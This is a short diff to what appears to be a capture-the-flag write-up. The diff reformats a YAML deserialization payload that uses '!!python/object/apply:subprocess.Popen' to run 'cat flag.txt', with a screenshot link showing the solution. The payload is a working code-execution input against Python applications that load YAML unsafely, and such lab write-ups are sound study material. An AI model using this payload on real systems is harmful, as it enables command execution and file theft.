@@ -90,11 +90,13 @@ I had to dig a little more to find how to give arguments to the command:
   
 And solved:
 
+```
+!!python/object/apply:subprocess.Popen
+- !!python/tuple
+  - cat
+  - flag.txt
+```
 
-    !!python/object/apply:subprocess.Popen
-    - !!python/tuple
-      - cat
-      - flag.txt
 ![](https://i.imgur.com/b0l46TJ.png)
 
 ----------
